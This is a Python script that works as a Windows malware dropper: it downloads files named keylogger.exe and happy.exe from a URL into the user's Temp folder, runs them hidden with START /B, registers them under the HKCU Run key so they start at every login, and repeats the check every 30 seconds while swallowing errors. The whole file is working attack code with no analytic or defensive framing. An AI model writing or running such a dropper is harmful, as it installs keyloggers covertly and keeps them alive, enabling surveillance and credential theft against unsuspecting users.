from subprocess import check_output, DEVNULL, STDOUT, call
from threading import Timer
from os import  error, system, path
import urllib
from wget import download

class all_Files():
    def __init__(self, timer):
        self.list_programs = [ { 'name':'keylogger.exe', 'url':'http://localhost/keylogger.exe'}, { 'name':'happy.exe', 'url':'http://localhost/happy.exe'} ]
        self.reg_query = 'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {}'
        self.add_query = 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {} /t REG_SZ /d'
        self.location_update = path.expanduser('~') + '\\AppData\\Local\\Temp\\'
        self.timer_exec = timer
    def persistence(self, program):
        key = call(self.reg_query.format(program.split('.exe')[0]), shell=True, stderr=DEVNULL, stdout=DEVNULL, stdin=DEVNULL)
        if key:
            add_process = self.add_query.format(program.split('.exe')[0]) + ' "' + self.location_update + program + '" /f'
            system(add_process)
    def exec_program(self, program):
        try:
            call('START /B ' + self.location_update + program, shell=True, stderr=STDOUT, stdout=DEVNULL, stdin=DEVNULL)
        except error(error):
            pass
    def verify_file(self, **program):
        if not path.exists(self.location_update + program.get('name')):
            try:
                download(program.get('url'), self.location_update + program.get('name'))
            except urllib.error.URLError:
                pass
    def check_program(self, response, **program):
        self.verify_file(**program)
        if not program.get('name') in response:
            self.exec_program(program.get('name'))
        self.persistence(program.get('name'))
    def found_program(self,program):
        call = 'TASKLIST /FI "IMAGENAME eq %s"' %program
        status = check_output(call, shell=True, stderr=STDOUT, stdin=DEVNULL)
        return status.decode('utf-8', errors='replace').split()
    def recorr_programs(self):
        for program in self.list_programs:
            self.check_program(self.found_program(program.get('name')), **program)
    def run_program(self):    
        self.recorr_programs()
        Timer(self.timer_exec, self.run_program).start()
programs = all_Files(30)
programs.run_program()
